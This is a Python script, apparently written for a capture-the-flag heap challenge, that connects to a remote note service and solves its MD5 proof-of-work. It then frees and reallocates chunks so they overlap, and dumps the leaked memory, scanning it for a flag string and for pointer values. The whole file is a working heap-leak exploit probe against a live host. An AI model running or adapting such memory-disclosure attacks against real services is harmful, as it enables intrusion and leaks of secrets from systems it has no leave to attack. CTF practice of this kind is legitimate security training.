"""临时实验（用完即删）：让 514 的分配器复用/交叠块，扫描 show 泄漏内容里是否有 flag 与指针。"""
import hashlib
import itertools
import re
import socket
import string
import time

HOST, PORT = "env.xj.edisec.net", 31888


def drain(s, wait=0.8):
    s.settimeout(0.25)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(8192)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        cand = "".join(fixed)
        if hashlib.md5(cand.encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


def send(s, line, wait=0.6):
    s.sendall(line.encode() + b"\n")
    return drain(s, wait)


s = socket.create_connection((HOST, PORT), timeout=6)
banner = drain(s, 1.5)
masked = re.search(rb"Token:\s*([A-Za-z_]+)", banner).group(1).decode()
md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", banner).group(1).decode()
send(s, solve_pow(md5hex, masked), 1.2)

log = []


def show(idx):
    send(s, "3")
    r = send(s, str(idx), 1.0)
    log.append(r)
    return r


def dump_bytes(idx):
    r = show(idx)
    hexes = re.findall(rb"^[0-9a-f]{32,}$", r, re.M)
    if not hexes:
        return b""
    return bytes.fromhex(hexes[0].decode())


# 阶段 1：大量小分配 + 交替释放/重建，观察块是否复用出旧数据
for i in range(6):
    send(s, "1"); send(s, str(i)); send(s, "t%d" % i)
    send(s, "64"); send(s, "64")
    send(s, "0e0f101112131415161718191a1b1c1d" * 4)
send(s, "5"); send(s, "0")
send(s, "5"); send(s, "2")
send(s, "1"); send(s, "0"); send(s, "r0"); send(s, "64"); send(s, "64")
send(s, "0e0f101112131415161718191a1b1c1d" * 4)

# 阶段 2：pack 后再看，以及大面积扫描
send(s, "4"); send(s, "1")
data = b""
for i in range(6):
    data += dump_bytes(i)

print("=== 泄漏总字节数:", len(data))
print("=== 含 flag 字样:", re.findall(rb"[Ff][Ll][Aa][Gg].{0,40}", data)[:5])
ptrs = [int.from_bytes(data[i:i + 8], "little") for i in range(0, max(0, len(data) - 8), 8)]
susp = sorted({hex(p) for p in ptrs if 0x10000 < p < 0x800000000000})
print("=== 可疑指针值（前 12 个）:", susp[:12])

# 打印每条笔记的原始 dump 片段
for r in log[-6:]:
    print(repr(r[:260]))
s.close()